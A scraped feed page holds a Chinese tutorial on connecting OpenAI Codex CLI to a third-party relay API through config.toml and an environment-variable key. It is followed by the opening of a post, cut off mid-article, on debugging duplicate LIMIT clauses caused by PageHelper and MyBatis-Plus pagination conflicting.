content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用自定义API接入OpenAI CodeX配置教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1614520451597639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jim860
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:08:47.000Z" title="Thu Nov 27 2025 07:08:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Codex 是OpenAI 推出的一系列人工智能编码工具，通过将任务委托给强大的云端和本地编码代理，帮助开发人员提升工作效率。支持原生终端、vscode插件、cursor插件等场景使用。</p>
<blockquote>
<p>本教程目的：使用第三方API（中转API）方式接入OpenAI CodeX服务。</p>
</blockquote>
<p>官网网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Fcodex%2F" target="_blank" title="https://openai.com/codex/" ref="nofollow noopener noreferrer">openai.com/codex/</a></p>
<h2 data-id="heading-0">系统要求</h2>

























<table><thead><tr><th>系统要求</th><th>细节</th></tr></thead><tbody><tr><td>操作系统</td><td>macOS 12+、Ubuntu 20.04+/Debian 10+ 或通过 WSL2 的Windows 11</td></tr><tr><td>Git（可选，推荐）</td><td>2.23+ 内置 PR 助手</td></tr><tr><td>内存</td><td>最低 4 GB（建议 8 GB）</td></tr><tr><td>Node版本</td><td>需要Node 22+</td></tr></tbody></table>
<h2 data-id="heading-1">步骤一：安装Codex CLI</h2>
<p>选择一种安装方式即可。</p>
<p><strong>npm（通用）</strong></p>
<pre><code class="hljs language-sh" lang="sh">npm i -g @openai/codex

<span class="hljs-comment"># 或在有时需要的原生包名：</span>
<span class="hljs-comment"># npm i -g @openai/codex@native</span>

codex --version
</code></pre>
<p><strong>Homebrew（macos系统推荐）</strong></p>
<pre><code class="hljs language-sh" lang="sh">brew update
brew install codex
codex --version
</code></pre>
<blockquote>
<p>如遇 codex 无法执行或 Node 版本过旧，请升级 Node（常见需要 Node 22+），或改用 Homebrew 安装。</p>
</blockquote>
<h2 data-id="heading-2">Codex配置</h2>
<blockquote>
<p>安装后，我们开始配置codex才能通过apikey方式接入我们的API。如果你是通过openai plus会员来使用codex，可跳过后续教程，codex中直接登录plus账号即可使用。</p>
</blockquote>
<h3 data-id="heading-3">1.在第三方中转平台注册并充值</h3>
<p>这里我们以一个第三方中转平台作为例子，进入网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.v3.cm" target="_blank" title="https://api.v3.cm" ref="nofollow noopener noreferrer">api.v3.cm</a> 进行注册并充值，然后在该网站 “令牌管理”页面，复制apikey，后续我们将该apikey接入到codex中使用。</p>
<h3 data-id="heading-4">2.codex配置文件config.toml</h3>
<p>Codex 启动时会在<code>~/.codex/</code> 读取<code>config.toml</code>文件。若不存在就新建：</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">mkdir</span> -p ~/.codex
nano ~/.codex/config.toml
</code></pre>
<p>在<code>config.toml</code>中加入如下配置，根据需求修改：</p>
<pre><code class="hljs language-json" lang="json">model_provider = <span class="hljs-string">"vapi"</span>  # 设置API供应商
model = <span class="hljs-string">"gpt-5"</span>        # 填写支持codex的模型即可
model_reasoning_effort = <span class="hljs-string">"low"</span> # 思考级别 low medium（默认） high minimal，不需要可以#注释掉

# 供应商设置
<span class="hljs-punctuation">[</span>model_providers.vapi<span class="hljs-punctuation">]</span>
name = <span class="hljs-string">"VAPI"</span>
base_url = <span class="hljs-string">"https://api.v3.cm/v1"</span>
env_key = <span class="hljs-string">"V_API_KEY"</span>    # 保留这个值，不需要替换为apikey
wire_api = <span class="hljs-string">"chat"</span> # 使用 /v1/chat/completions 协议
query_params = <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
request_max_retries = <span class="hljs-number">4</span>            # 失败最大重试次数
stream_max_retries = <span class="hljs-number">10</span>            # 流中断后最大重试次数

# 可选：定义一个 profile，便于命令行快速切换
<span class="hljs-punctuation">[</span>profiles.vapi<span class="hljs-punctuation">]</span>
model_provider = <span class="hljs-string">"vapi"</span>
model = <span class="hljs-string">"gpt-5"</span>
approval_policy = <span class="hljs-string">"on-request"</span>      # 需要时再询问是否执行
sandbox_mode = <span class="hljs-string">"workspace-write"</span>    # 允许在当前工程写文件，依旧禁网

</code></pre>
<h3 data-id="heading-5">3.添加apikey环境变量</h3>
<p>这步很重要，我们需要将我们设置的环境变量<code>V_API_KEY</code>添加到系统配置中。</p>
<blockquote>
<p>key值就是我们从中转网站的 “令牌管理”页面复制的sk-开头的apikey。</p>
</blockquote>
<h4 data-id="heading-6">Window用户设置apikey环境变量：</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 永久设置（推荐）</span>
setx V_API_KEY <span class="hljs-string">"sk-xxxxxx"</span>

<span class="hljs-comment"># 临时设置，切换窗口后失效</span>
<span class="hljs-built_in">set</span> V_API_KEY=sk-xxxxxx
</code></pre>
<h4 data-id="heading-7">Mac/Linux用户设置环境变量：</h4>
<p><strong>方法一：永久设置（推荐)</strong></p>
<p>1.编辑配置文件（或直接手动打开文件）</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 如果使用 bash</span>
nano ~/.bash_profile
<span class="hljs-comment"># 或</span>
nano ~/.bashrc

<span class="hljs-comment"># 如果使用 zsh（Mac默认）</span>
nano ~/.zshrc
</code></pre>
<p>2.在最后新行，添加以下内容</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> V_API_KEY=<span class="hljs-string">"sk-xxxxxx"</span>
</code></pre>
<p>3.保存并生效</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># bash</span>
<span class="hljs-built_in">source</span> ~/.bash_profile

<span class="hljs-comment"># zsh</span>
<span class="hljs-built_in">source</span> ~/.zshrc

</code></pre>
<p><strong>方法二：临时设置</strong></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> V_API_KEY=<span class="hljs-string">"sk-xxxxxx"</span>
</code></pre>
<h4 data-id="heading-8">验证是否设置成功</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># Windows (CMD)</span>
<span class="hljs-built_in">echo</span> %V_API_KEY%

<span class="hljs-comment"># Windows (PowerShell)</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$env</span>:V_API_KEY

<span class="hljs-comment"># Mac/Linux</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$V_API_KEY</span>
</code></pre>
<p>如果显示<code>sk-xxxxxx</code>则说明设置成功！</p>
<h2 data-id="heading-9">启动命令</h2>
<h3 data-id="heading-10">Codex CLI原生命令</h3>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 直接提问</span>
codex <span class="hljs-string">"你好"</span>

<span class="hljs-comment"># 选择提供商并提问(如果有多个提供商的话)</span>
codex --profile vapi <span class="hljs-string">"你好"</span>
</code></pre>
<h3 data-id="heading-11">vscode中使用Codex插件</h3>
<p>如果是在vscode中使用codex插件，我们配置好后需要完全退出vscode重新启动才能生效。</p>
<h2 data-id="heading-12">Codex高级使用技巧指南</h2>
<h3 data-id="heading-13">CLI 参考</h3>

























<table><thead><tr><th>命令</th><th>目的</th><th>例子</th></tr></thead><tbody><tr><td>codex</td><td>交互式TUI</td><td>codex</td></tr><tr><td>codex "..."</td><td>交互式 TUI 的初始提示</td><td>codex "fix lint errors"</td></tr><tr><td>codex exec "..."</td><td>非交互式"自动化模式"</td><td>codex exec "explain utils.ts"</td></tr></tbody></table>
<h3 data-id="heading-14">非交互/CI模式</h3>
<p>在管道中以无头方式运行 Codex。示例 GitHub Action 步骤：</p>
<pre><code class="hljs language-sh" lang="sh">- name: Update changelog via Codex
  run: |
    npm install -g @openai/codex
    <span class="hljs-built_in">export</span> OPENAI_API_KEY=<span class="hljs-string">"<span class="hljs-variable">${{ secrets.OPENAI_KEY }</span>}"</span>
    codex <span class="hljs-built_in">exec</span> --full-auto <span class="hljs-string">"update CHANGELOG for next release"</span>
</code></pre>
<h3 data-id="heading-15">模型上下文协议（MCP）</h3>
<p>通过在<code>~/.codex/config.toml</code>中定义一个<code>mcp_servers</code>部分，可以将 Codex CLI 配置为使用 MCP 服务器。它旨在反映 Claude 和 Cursor 等工具在其各自的 JSON 配置文件中的 mcpServers 定义方式，尽管 Codex 的格式略有不同，因为它使用的是 TOML 而不是 JSON，例如：</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># IMPORTANT: the top-level key is `mcp_servers` rather than `mcpServers`.</span>
[mcp_servers.server-name]
<span class="hljs-built_in">command</span> = <span class="hljs-string">"npx"</span>
args = [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"mcp-server"</span>]
<span class="hljs-built_in">env</span> = { <span class="hljs-string">"API_KEY"</span> = <span class="hljs-string">"value"</span> }
</code></pre>
<h2 data-id="heading-16">参考资料</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenai%2Fcodex%2Fblob%2Fmain%2Fdocs%2Fconfig.md%23config" target="_blank" title="https://github.com/openai/codex/blob/main/docs/config.md#config" ref="nofollow noopener noreferrer">Codex官方详细配置说明文档</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PageHelper 防坑指南：从兜底方案到根治方案]]></title>    <link>https://juejin.cn/post/7577171133444571172</link>    <guid>https://juejin.cn/post/7577171133444571172</guid>    <pubDate>2025-11-27T07:02:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444571172" data-draft-id="7577042851080011819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PageHelper 防坑指南：从兜底方案到根治方案"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-27T07:02:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PageHelper 防坑指南：从兜底方案到根治方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:02:50.000Z" title="Thu Nov 27 2025 07:02:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PageHelper 防坑指南：从兜底方案到根治方案</h2>
<p>前几天线上报了个奇怪的错，SQL 里出现了两个 LIMIT。当时看到日志我整个人都懵了，心想这什么鬼，谁能写出这种 SQL？</p>
<p>后来一顿排查，发现是 PageHelper 和 MyBatis-Plus 的分页"打架"了。更坑的是，这问题藏了好几个月才暴露出来。</p>
<p>今天就来聊聊这个坑，以及我们后来是怎么防范的。</p>
<h3 data-id="heading-1">先看看当时的报错</h3>
<p>那天下午，告警群突然弹了条消息：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-18</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">17.892</span> ERROR [http<span class="hljs-operator">-</span>nio<span class="hljs-number">-8080</span><span class="hljs-operator">-</span><span class="hljs-keyword">exec</span><span class="hljs-number">-23</span>] c.x.common.exception.GlobalExceptionHandler <span class="hljs-operator">-</span> <span class="hljs-keyword">SQL</span>执行异常
org.springframework.jdbc.BadSqlGrammarException: 
### Error querying database. Cause: java.sql.SQLSyntaxErrorException: 
You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">'LIMIT 10 LIMIT 10'</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span>
### <span class="hljs-keyword">SQL</span>: <span class="hljs-keyword">SELECT</span> id, order_no, user_id, amount, status, create_time <span class="hljs-keyword">FROM</span> t_order <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> ? LIMIT <span class="hljs-number">10</span> LIMIT <span class="hljs-number">10</span>
</code></pre>
<p><code>LIMIT 10 LIMIT 10</code>，两个 LIMIT 挨在一起，SQL 直接炸了。</p>
<p>我第一反应是，谁这么虎，手写 SQL 写了俩 LIMIT？但转念一想不对，我们的 SQL 都是 MyBatis 生成的，不可能有这种低级错误。</p>
<h3 data-id="heading-2">顺着代码扒下去</h3>
<p>根据堆栈信息找到了对应的 Mapper，代码长这样：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderServiceImpl.java</span>
<span class="hljs-keyword">public</span> IPage&lt;Order&gt; <span class="hljs-title function_">queryOrderList</span><span class="hljs-params">(OrderQueryDTO dto)</span> {
    PageHelper.startPage(dto.getPageNum(), dto.getPageSize());
    
    Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(dto.getPageNum(), dto.getPageSize());
    <span class="hljs-keyword">return</span> orderMapper.selectPage(page, buildQueryWrapper(dto));
}
</code></pre>
<p>看到这我就明白了。</p>
<p>这段代码里同时用了两种分页方案：上面是 PageHelper 的 <code>startPage()</code>，下面是 MyBatis-Plus 的 <code>IPage</code>。两边都会往 SQL 里拼 LIMIT，所以出现了两个。</p>
<p>但问题是，这代码是谁写的？什么时候写的？</p>
<p>翻了一下 git 记录，真相浮出水面了。</p>
<h3 data-id="heading-3">历史的锅</h3>
<p>原来我们项目之前全部用的 PageHelper，后来技术栈统一，要求迁移到 MyBatis-Plus。这个接口是三个月前改的，开发同学把分页逻辑改成了 IPage，但是忘了把上面那行 <code>PageHelper.startPage()</code> 删掉。</p>
<p>最骚的是，这 bug 藏了三个月才爆出来。为什么能藏这么久？这就要说说 ThreadLocal 的多层防护机制了。</p>
<h3 data-id="heading-4">为什么这个 bug 这么难暴露</h3>
<p>先看看正常情况下，ThreadLocal 里的分页信息是怎么被清理的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph 第一层防护["第一层防护：PageHelper 自身"]
        A[PageHelper.startPage] --&gt; B[设置 ThreadLocal]
        B --&gt; C[执行 SQL 查询]
        C --&gt; D[PageInterceptor.intercept]
        D --&gt; E["finally { clearPage() }"]
        E --&gt; F[清理 ThreadLocal]
    end
    
    style 第一层防护 fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
    style F fill:#c8e6c9,stroke:#388e3c
</code></pre>
<p>PageHelper 自己在 finally 里做了清理，正常执行查询的话，ThreadLocal 肯定会被清掉。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph 第二层防护["第二层防护：Tomcat 线程池"]
        G[请求结束] --&gt; H[线程归还线程池]
        H --&gt; I{下次被复用}
        I --&gt; J[大概率是新的业务场景]
        J --&gt; K[不一定会触发分页查询]
    end
    
    style 第二层防护 fill:#e3f2fd,stroke:#2196f3,stroke-width:2px
    style K fill:#bbdefb,stroke:#1976d2
</code></pre>
<p>就算第一层没清理干净，线程池复用的时候，下一个请求也不一定会执行分页查询。就算执行了，也不一定是 MyBatis-Plus 的 selectPage。</p>
<p>所以这个 bug 要暴露，需要满足一连串苛刻的条件：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph 触发条件["Bug 触发条件链"]
        A["startPage 被调用"] --&gt; B["没执行查询就结束"]
        B --&gt; C["ThreadLocal 残留"]
        C --&gt; D["线程被复用"]
        D --&gt; E["新请求用了 MBP 分页"]
        E --&gt; F["两个 LIMIT 撞一起"]
    end
    
    style 触发条件 fill:#fff3e0,stroke:#ff9800,stroke-width:2px
    style F fill:#ffcc80,stroke:#f57c00
</code></pre>
<p>这概率，难怪三个月才碰上。平时可能也触发了，但如果是普通查询被加了 LIMIT，可能就是少返回了几条数据，根本没人注意到。这次是两个 LIMIT 撞一起直接报语法错误，才被发现。</p>
<h3 data-id="heading-5">PageHelper 的工作原理</h3>
<p>这里简单过一下 PageHelper 的原理，不然后面的分析看不懂。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 用户代码["用户代码"]
        A["PageHelper.startPage(1, 10)"]
    end
    
    subgraph ThreadLocal存储["ThreadLocal 存储"]
        B["LOCAL_PAGE.set(page)"]
    end
    
    subgraph MyBatis执行["MyBatis 执行"]
        C["执行 Mapper 方法"]
        D["PageInterceptor.intercept()"]
    end
    
    subgraph 分页处理["分页处理"]
        E{"skip() 判断"}
        F["需要分页"]
        G["不需要分页"]
        H["生成 COUNT SQL"]
        I["执行 COUNT 查询"]
        J["getPageSql() 拼接 LIMIT"]
        K["执行分页查询"]
    end
    
    subgraph 清理["清理"]
        L["finally: clearPage()"]
        M["LOCAL_PAGE.remove()"]
    end
    
    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    E --&gt;|"ThreadLocal 有值"| F
    E --&gt;|"ThreadLocal 无值"| G
    F --&gt; H
    H --&gt; I
    I --&gt; J
    J --&gt; K
    K --&gt; L
    G --&gt; L
    L --&gt; M
    
    style 用户代码 fill:#e8f5e9,stroke:#4caf50,stroke-width:2px
    style ThreadLocal存储 fill:#fff3e0,stroke:#ff9800,stroke-width:2px
    style MyBatis执行 fill:#e3f2fd,stroke:#2196f3,stroke-width:2px
    style 分页处理 fill:#fce4ec,stroke:#e91e63,stroke-width:2px
    style 清理 fill:#f3e5f5,stroke:#9c27b0,stroke-width:2px
</code></pre>
<p>关键点在于：<code>startPage()</code> 把分页参数存到 ThreadLocal，然后拦截器在执行 SQL 的时候读出来拼接 LIMIT。</p>
<p>正常情况下，finally 里会清理 ThreadLocal，没问题。</p>
<p>但如果 <code>startPage()</code> 之后、查询之前就出问题了（异常、提前 return、或者像我们这样根本没走 PageHelper 的查询），那 ThreadLocal 就残留下来了。</p>
<h3 data-id="heading-6">网上看到的一个方案</h3>
<p>搜问题的时候看到一篇文章，作者遇到的场景是把查询改成 ES 了，但忘删 <code>startPage()</code>。他们的解决方案是在 Filter 或 Dubbo SPI 里统一调用 <code>PageHelper.clearPage()</code>：</p>
